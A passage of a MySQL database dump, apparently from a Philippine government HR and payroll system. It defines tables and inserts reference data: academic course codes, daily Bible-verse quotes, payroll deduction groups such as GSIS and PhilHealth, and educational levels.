INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('D.P.A.', 'Doctor in Public Administration');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('Primary', 'Primary');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BSFS', 'BS Foreign Service');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('MSSD', 'M.S. Social Development');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BType', 'Basic Typing');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('MAMSMAM', 'Master of Management in Agribusiness Management');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BSIndTech', 'BS Industrial Technology');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BSBA-Mgmt', 'BSBA Management');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('ABPolScie', 'AB Political Science');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('LIACOM', 'Liberal Arts and Commerce-Mgmt. and Economics');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('LI.B', 'LI.B');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('AB-G', 'AB-General');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BSN', 'BS Nursing');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('ZMZ', 'BS Zoology Major in Marine Zoology');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('FA', 'MS Fisheries Major Aquaculture');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('PhFS', 'Ph.D. Fisheries Science');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('MSME', 'Master of Science in Mechanical Engineering');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('HDIT', 'Honors Diploma in Information Technology');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BSEE', 'BS Electronics Engineering');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('MSMGE', 'Master of Science in Management Engineering');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BSECE', 'BS Electronics and Communications Engineering');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BSCH', 'BS Chemistry');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('MSCH', 'Master of Science in Chemistry');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('PhDCH', 'Doctor of Philosophy in Chemistry');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('CTech', 'Computer Technician');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('ABBA', 'Bachelor of Arts in Communication Arts');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('MAS', 'Master of Arts in Sociology');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BSFT', 'BS Food Technology');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BSAP', 'BS Applied Physics');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('JD', 'Juris Doctor');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('LLMIELPO', 'LL.M. IELPO Course');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('GIP', 'General Intellectual Property Couse');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BSP', 'BS Physics');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BSA', 'BS Agriculture');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('MSA', 'Master of Science in Agriculture');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BSICS', 'BS Information and Computer Science');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BSOM', 'BS Office Management');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BSPSY', 'BS Psychology');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BAOABA', 'B.S. in Office Admin. Major in Busines Admin.');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('ABDC', 'Bachelor of Arts in Development Communication');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('CG', 'Caregiver');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BBF', 'Bachelor in Banking and Finance');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('CET', 'Computer Electronic Technician');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('MIT', 'Master in Information Technology');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BSCCS', 'BS Computing Major in Computer Science');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('COMPST', 'Computer Software Technology');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('ABENTRE', 'Bachelor of Arts in Entrepreneurship');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('ABL', 'Bachelor of Arts in Literature');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BSBAM', 'BS Business Management Major in Management');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('MMGT', 'Master in Management');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('CTP', 'Certificate in Teaching Program');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('CSA', 'Computer Secretarial Administration');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('COMPSEC', 'Computer Secretarial');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('ELEC', 'Electronics');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('TM', 'Television Mechanics');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('JAP', 'Japanese Language');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BSBAA', 'BS Business Administration and Accounting');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('MSIM', 'Master of Science in Information Management');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BSED', 'Bachelor of Secondary Education');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BSCBA', 'BS Commerce Major in Business Administration');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BA', 'Journalism');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BS PT', 'BS Physical Therapy');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('OM', 'Office Management');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BOIS', 'Diploma in Business Office Information System');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BS CBF', 'BS Commerce - Banking and Finance');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BS BCA', 'BS Brodcast Arts');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('ICT', 'Information Communication Technology');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('ABComm', 'AB Communication');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BS Crim', 'BS Criminology');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('MSAc', 'Master of Science in Accountancy');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BSBMGMT', 'BS Business Management Major in Marketing');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BSBAMM', 'BS Business Management Major in Marketing Mgmt');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BSBE', 'BS Business Economics');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BSAM', 'BS Applied Math');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('ABSComm', 'Bachelor of Arts in Speech Communication');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('MASPED', 'Master of Arts in Special Education');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BJourn', 'Bachelor in Journalism');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('DRSM', 'Dressmaking');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BSBAMgmt', 'BS Business Administration Major in Management');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BSF', 'BS Forestry');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('MMDM', 'Master in Management in Development Management');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BSG', 'BS Geography');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BASocSci', 'BA Social Sciences');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BASocio', 'BA Sociology');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BSME', 'BS Mechanical Engineering');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BAcctg', 'Bachelor in Accounting');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BSBAMktg', 'BS Business Administration Major in Marketing');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('MTM', 'Masters in Technology Management');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BSMSE', 'BS Materials Science and Engineering');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('HGM', 'Housekeeping and Guestroom Maintenance');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BAIS', 'Bachelor of Arts in International Studies');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('DHRM', 'Diploma of Science in Hotel and Restaurant Mgmt');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('MT', 'Mechanical Technology');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('RAT', 'Refrigeration and Aircon Technician');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BSMM', 'BS Marketing Management');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('JL', 'Japanese Language');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BSHRM', 'BS Hotel and Restaurant Management');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BSHRS', 'BS Hotel and Restaurant Services');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BSBAMMgt', 'BS Business Administration Major in Marketing Mgmt');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BC', 'Basic Computer');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BSAdmin', 'BS Administration');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BSEduc', 'BS Education');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('TD', 'Technical Drawing');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('ECT', 'Electronics Communication Technician');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('MStat', 'Master of Statistics');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BSMedTech', 'BS Medical Technology');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('MPH', 'Master in Public Health');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('MSNut', 'MS Nutrition');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('DAppNut', 'Diploma in Applied Nutrition');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('PhDN', 'Ph.D. Nutrition');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('AAS', 'Associate in Arts - Secretarial Course');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BSCA', 'BS Commerce - Accounting');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('CompTech', 'Computer Technology');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BSM', 'BS Management');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('ABP', 'AB Psychology');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BS EM', 'BS Entrepreneural Management');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('DIT', 'Diploma in Information Technology');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BSAT', 'BS Accounting Technology');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BS IS', 'BS Information System');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('ADC', 'Advanced Diploma in Computing');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BSAE', 'Bachelor of Science in Agricultural Engineering');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('MSCE', 'Master in Civil Engineer');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('Phd', 'Phd');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('MS', 'MS');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('PhDEnvEng', 'PhD Environmental Engineering');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BSIEn', 'BS Industrial Engineering');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('AT', 'Automotive Technology');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('ASNCII', 'Automotive Servicing NC II');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('MScEE', 'MSc Environmental Engineering');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BSSC', 'BS Sociology ');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('MSMF', 'MS Marine Fisheries');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BSAEc', 'Bachelor of Science in Agricultural Economics');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('MAP', 'MA Philosophy');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('AB PHI', 'AB Philosophy');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('CETech.', 'Civil Engineering Technology');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BSTTM', 'Bachelor of Science Travel and Tourism Management');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('PM', 'Public Management');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('MATV', 'Master of Art in Teaching Vocational');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BSIM', ' BS Information Management');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BIM', 'Business Information Management');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BSAgr', 'BS Agronomy');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('MSIFS', 'Master of Science in food Science');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('B PE Maj', 'B in P.E. Major in Sports and Wellness Mgt.');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('MaTechMgt', 'Masters in Technology Management');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('EIM', 'Electrical Installation and Maintenance NCII');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('PhD Meteo', 'Ph.D. Meteorology');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BA-FS', 'Bachelor of Arts Major in Foreign Service');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BSPE', 'Bachelor of Science in Petroleum Engineering');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('DPMM', 'Doctor of Philosophy in Molecular Medicine');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('MDPhdMM', 'MD-PhD in Molecular Medicine');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BSPhyFT', 'B.Sc.Physics for Teacher');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('MSP', 'M.Sc. Physics');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('PhD.P', 'Ph.D. Physics');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('BSCE', 'BS in Chemical Engineering');
INSERT INTO `tblcourse` (`courseCode`, `courseDesc`) VALUES ('Ph.D.P', '');


#
# TABLE STRUCTURE FOR: tblcustodian
#

DROP TABLE IF EXISTS `tblcustodian`;

CREATE TABLE `tblcustodian` (
  `custodianId` int(11) NOT NULL AUTO_INCREMENT,
  `officeCode` varchar(20) NOT NULL DEFAULT '',
  `empNumber` varchar(20) CHARACTER SET latin1 COLLATE latin1_bin NOT NULL DEFAULT '',
  PRIMARY KEY (`custodianId`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

#
# TABLE STRUCTURE FOR: tbldailyquote
#

DROP TABLE IF EXISTS `tbldailyquote`;

CREATE TABLE `tbldailyquote` (
  `day` int(11) NOT NULL DEFAULT 0,
  `quote` text NOT NULL,
  PRIMARY KEY (`day`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

INSERT INTO `tbldailyquote` (`day`, `quote`) VALUES ('4', 'I PRAISE YOU BECAUSE I AM FEARFULLY AND WONDERFULLY MAD; <br> YOUR WORKS ARE WONDERFUL, I KNOW THAT FULL WELL.<br><br>Psalm 139:14 <br>');
INSERT INTO `tbldailyquote` (`day`, `quote`) VALUES ('30', 'Your word is a lamp to my feet and a light for my path');
INSERT INTO `tbldailyquote` (`day`, `quote`) VALUES ('2', 'Who god so love the world he give only begotten son');
INSERT INTO `tbldailyquote` (`day`, `quote`) VALUES ('1', 'Nobody can go back and start a new beginning but anyone can start today and make a new ending-Maria Robinson');
INSERT INTO `tbldailyquote` (`day`, `quote`) VALUES ('5', 'Lord, I have come to you for protection; <br> never let me be defeated! <br>Because you are righteous, help me and rescue me. <br> Listen to me and save me!<br><br>Psalm 71:1;2 <br>');
INSERT INTO `tbldailyquote` (`day`, `quote`) VALUES ('6', 'Create in me a pure heart, O God and renew a steadfast spirit within me.<br><br>Psalm 51:10 <br>');
INSERT INTO `tbldailyquote` (`day`, `quote`) VALUES ('7', 'Let the morning bring me word of your unfailing love,<br>\r\n						for I have put my trust in you. <br> Show me the way I should go for to you I lift up my soul.<br><br>Psalm 143:8 <br>');
INSERT INTO `tbldailyquote` (`day`, `quote`) VALUES ('8', 'Praise the Lord!  <br>  Praise God in his temple!  <br>  Praise his strength in heaven!  <br>  Praise him for the mighty things he has done.  <br>  Praise his supreme greatness.<br><br>Psalm 150:1;2 <br>');
INSERT INTO `tbldailyquote` (`day`, `quote`) VALUES ('9', 'But as for me, how wonderful to be near God, <br> to find protection with the Sovereign Lord and to proclaim all that he has done!<br><br>Psalm 73:28 <br>');
INSERT INTO `tbldailyquote` (`day`, `quote`) VALUES ('10', 'I thank you, Lord with all my heart, I sing praise to you before the Gods <br> I face your holy temple, <br> bow down, and praise your name because of your constant love and faithfulness, <br> because you have shown that your name and your commands are supreme.<br><br>Psalm 138:1;2 <br>');
INSERT INTO `tbldailyquote` (`day`, `quote`) VALUES ('11', 'Search me, O Lord and know my heart; test me and know my anxious thoughts. <br> See if there is any offensive way in me, and lead me in the way everlasting.<br><br>\r\n						Psalm 30:11 <br>');
INSERT INTO `tbldailyquote` (`day`, `quote`) VALUES ('12', 'Your ways O GOD are Holy. <br> What GOD is so great as our GOD? <br> You are the who performs miracles; <br> You display your power among the people.<br><br>Psalm 77:13,14 <br>');
INSERT INTO `tbldailyquote` (`day`, `quote`) VALUES ('13', 'Let thy steadfast Love, <br> Oh Lord, be upon us, <br> even as we hope in thee.<br><br>Psalm 33:22 <br>');
INSERT INTO `tbldailyquote` (`day`, `quote`) VALUES ('14', 'Let the words of my mouth and the meditation of my heart <br> be acceptable in thy sight O Lord, my rock and my redeemer.<br><br>Psalm 1,15:1 <br>');
INSERT INTO `tbldailyquote` (`day`, `quote`) VALUES ('15', 'To do your will O my God, is my desire; <br> your law is within my heart.<br><br>Psalm 40:8 <br>');
INSERT INTO `tbldailyquote` (`day`, `quote`) VALUES ('16', 'TEACH US TO NUMBER OUR DAYS ARIGHT <br> THAT WE MAY GAIN A HEART OF WISDOM.<br><br>Psalm 90:12 <br>');
INSERT INTO `tbldailyquote` (`day`, `quote`) VALUES ('17', 'But I call to the Lord God for help, and he will save me. <br> Morning, noon, and night my complaints and groans go up to him, and he will hear my voice. <br><br>Psalm 55:16;17 <br>');
INSERT INTO `tbldailyquote` (`day`, `quote`) VALUES ('18', 'Hear my prayer, O God; <br> don\'t turn away from my plea! <br> Listen to me and answer me; <br> I am worn out by my worries.<br><br>Psalm 55:1;2 <br>');
INSERT INTO `tbldailyquote` (`day`, `quote`) VALUES ('19', 'LORD GOD, MY SAVIOR, I CRY OUT ALL DAY, AND AT NIGHT I COME BEFORE YOU. <br> HEAR MY PRAYER, LISTEN TO MY CRY FOR HELP.<br><br>Psalm 88:1;2 <br>');
INSERT INTO `tbldailyquote` (`day`, `quote`) VALUES ('20', 'Whom have I in heaven but you? <br> And being with you, I desire nothing on earth.  <br>  My flesh and my heart may fall, but GOD is the strength of my heart and my portion forever. <br><br>Psalm 73:25 <br>');
INSERT INTO `tbldailyquote` (`day`, `quote`) VALUES ('21', 'Save me, Lord, from evil men; <br> Keep me safe from violent men.<br><br>Psalm 140:1 <br>');
INSERT INTO `tbldailyquote` (`day`, `quote`) VALUES ('22', 'In you, O Lord, I have taken refuge; <br> Let me never be put to shame.  <br> Rescue me and deliver me in your righteousness; <br> turn your ear to me and save me. <br> Be my rock of refuge, to which I can always go. <br><br>Psalm 71:1,3 <br>');
INSERT INTO `tbldailyquote` (`day`, `quote`) VALUES ('23', 'For you, O Lord, have delivered my soul from death, <br> my eyes from tears, my feet from stumbling. <br> that I may walk before the Lord in the land of the Living.<br><br>Psalm 116:8;9 <br>');
INSERT INTO `tbldailyquote` (`day`, `quote`) VALUES ('24', 'Because your love is better than Life, <br> My lips will glorify you, <br> I will praise you as long as I live... <br><br>Psalm 63:3,4 <br>');
INSERT INTO `tbldailyquote` (`day`, `quote`) VALUES ('25', 'May all who seek you rejoice and be glad in you; <br> May those who Love Your salvation always say, Let God be exalted! <br><br>Psalm 70:4 <br>');
INSERT INTO `tbldailyquote` (`day`, `quote`) VALUES ('26', 'Many, O Lord my God, are the wonders you have done. <br> The things you have planned for us no one can recount to you; <br> were I to speak and tell of them, <br> they would be too many to declare.<br><br>Psalm 40:5 <br>');
INSERT INTO `tbldailyquote` (`day`, `quote`) VALUES ('27', 'We give thanks to you, <br> O God, we give thanks to you! <br> We proclaim how great you are <br> and tell of the wonderful things you have done.<br><br>Psalm 75:1 <br>');
INSERT INTO `tbldailyquote` (`day`, `quote`) VALUES ('28', 'I RISE BEFORE DAWN AND CRY FOR HELP; <br> I HOPE IN THY WORDS. <br> MY EYES ARE AWAKE BEFORE THE WATCHES OF THE NIGHT, <br> THAT I MAY MEDITATE UPON THY PROMISE. <br><br>Psalm 119:147,148 <br>');
INSERT INTO `tbldailyquote` (`day`, `quote`) VALUES ('29', 'Praise the Lord, O my soul; I will praise the Lord all my life. I will sing praise to my God as long as I live.<br><br>Psalm 146:1');
INSERT INTO `tbldailyquote` (`day`, `quote`) VALUES ('3', 'I thank you now Lord for the recent blessings I received and for the blessing yet to come coz\' I know you are not done with me yet. In Jesus Name I pray amen.');


#
# TABLE STRUCTURE FOR: tbldeduction
#

DROP TABLE IF EXISTS `tbldeduction`;

CREATE TABLE `tbldeduction` (
  `deductionCode` varchar(20) NOT NULL DEFAULT '',
  `deductionDesc` varchar(50) NOT NULL DEFAULT '',
  `deductionType` varchar(20) NOT NULL DEFAULT '',
  `deductionGroupCode` varchar(20) DEFAULT NULL,
  `deductionAccountCode` varchar(50) NOT NULL DEFAULT '0',
  `hidden` tinyint(1) NOT NULL DEFAULT 0,
  PRIMARY KEY (`deductionCode`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

#
# TABLE STRUCTURE FOR: tbldeductiongroup
#

DROP TABLE IF EXISTS `tbldeductiongroup`;

CREATE TABLE `tbldeductiongroup` (
  `deductionGroupCode` varchar(20) DEFAULT NULL,
  `deductionGroupDesc` varchar(50) DEFAULT NULL,
  `deductionGroupAccountCode` varchar(50) NOT NULL DEFAULT '0'
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

INSERT INTO `tbldeductiongroup` (`deductionGroupCode`, `deductionGroupDesc`, `deductionGroupAccountCode`) VALUES ('GSIS', 'Government Service Insurance System', '0');
INSERT INTO `tbldeductiongroup` (`deductionGroupCode`, `deductionGroupDesc`, `deductionGroupAccountCode`) VALUES ('PAGIBIG', 'PAGIBIG', '0');
INSERT INTO `tbldeductiongroup` (`deductionGroupCode`, `deductionGroupDesc`, `deductionGroupAccountCode`) VALUES ('PHILHEALTH', 'PhilHealth', '0');
INSERT INTO `tbldeductiongroup` (`deductionGroupCode`, `deductionGroupDesc`, `deductionGroupAccountCode`) VALUES ('OTHERS', 'Other agency', '0');
INSERT INTO `tbldeductiongroup` (`deductionGroupCode`, `deductionGroupDesc`, `deductionGroupAccountCode`) VALUES ('BIR', 'Bureau of Internal Revenue', '0');
INSERT INTO `tbldeductiongroup` (`deductionGroupCode`, `deductionGroupDesc`, `deductionGroupAccountCode`) VALUES ('PHILAM', 'PhilAm', '0');
INSERT INTO `tbldeductiongroup` (`deductionGroupCode`, `deductionGroupDesc`, `deductionGroupAccountCode`) VALUES ('DOST', 'Department of Science and Technology', '0');
INSERT INTO `tbldeductiongroup` (`deductionGroupCode`, `deductionGroupDesc`, `deductionGroupAccountCode`) VALUES ('DMPC', 'DOST Multi-Purpose Cooperative', '0');
INSERT INTO `tbldeductiongroup` (`deductionGroupCode`, `deductionGroupDesc`, `deductionGroupAccountCode`) VALUES ('MUNIF1', 'Male Uniform 1', '0');
INSERT INTO `tbldeductiongroup` (`deductionGroupCode`, `deductionGroupDesc`, `deductionGroupAccountCode`) VALUES ('MEDOCARE', 'MEDO CARE', '0');
INSERT INTO `tbldeductiongroup` (`deductionGroupCode`, `deductionGroupDesc`, `deductionGroupAccountCode`) VALUES ('LBP', 'Landbank', '0');
INSERT INTO `tbldeductiongroup` (`deductionGroupCode`, `deductionGroupDesc`, `deductionGroupAccountCode`) VALUES ('SIKAT', 'SIKAT', '0');
INSERT INTO `tbldeductiongroup` (`deductionGroupCode`, `deductionGroupDesc`, `deductionGroupAccountCode`) VALUES ('COCO LIFE', 'COCO LIFE', '');
INSERT INTO `tbldeductiongroup` (`deductionGroupCode`, `deductionGroupDesc`, `deductionGroupAccountCode`) VALUES ('Housing', 'Housing', '0');
INSERT INTO `tbldeductiongroup` (`deductionGroupCode`, `deductionGroupDesc`, `deductionGroupAccountCode`) VALUES ('SIKAT', 'SIKAT', '0');
INSERT INTO `tbldeductiongroup` (`deductionGroupCode`, `deductionGroupDesc`, `deductionGroupAccountCode`) VALUES ('HMO', 'Phil British', '0');


#
# TABLE STRUCTURE FOR: tblduties
#

DROP TABLE IF EXISTS `tblduties`;

CREATE TABLE `tblduties` (
  `positionCode` varchar(20) NOT NULL DEFAULT '',
  `duties` text NOT NULL,
  `percentWork` int(11) NOT NULL DEFAULT 0,
  `dutyNumber` int(11) NOT NULL DEFAULT 0
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

#
# TABLE STRUCTURE FOR: tbleducationallevel
#

DROP TABLE IF EXISTS `tbleducationallevel`;

CREATE TABLE `tbleducationallevel` (
  `level` int(11) NOT NULL DEFAULT 0,
  `levelCode` varchar(30) NOT NULL DEFAULT '',
  `levelDesc` varchar(50) NOT NULL DEFAULT '',
  `system` tinyint(1) NOT NULL DEFAULT 0,
  PRIMARY KEY (`levelCode`),
  KEY `levelDesc` (`levelDesc`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

INSERT INTO `tbleducationallevel` (`level`, `levelCode`, `levelDesc`, `system`) VALUES ('7', 'ELM', 'Elementary', '1');
INSERT INTO `tbleducationallevel` (`level`, `levelCode`, `levelDesc`, `system`) VALUES ('5', 'VCL', 'Vocational', '1');
INSERT INTO `tbleducationallevel` (`level`, `levelCode`, `levelDesc`, `system`) VALUES ('0', 'MAS', 'Masteral', '1');
INSERT INTO `tbleducationallevel` (`level`, `levelCode`, `levelDesc`, `system`) VALUES ('3', 'CLG', 'College', '1');
INSERT INTO `tbleducationallevel` (`level`, `levelCode`, `levelDesc`, `system`) VALUES ('2', 'MAMS', 'Master\'s Degree', '1');
INSERT INTO `tbleducationallevel` (`level`, `levelCode`, `levelDesc`, `system`) VALUES ('1', 'Ph.D.', 'Doctorate', '1');
INSERT INTO `tbleducationallevel` (`level`, `levelCode`, `levelDesc`, `system`) VALUES ('6', 'HSL', 'High School', '1');
INSERT INTO `tbleducationallevel` (`level`, `levelCode`, `levelDesc`, `system`) VALUES ('0', 'GDS', 'Graduate Studies', '0');


#
# TABLE STRUCTURE FOR: tblempaccount
#

DROP TABLE IF EXISTS `tblempaccount`;

CREATE TABLE `tblempaccount` (
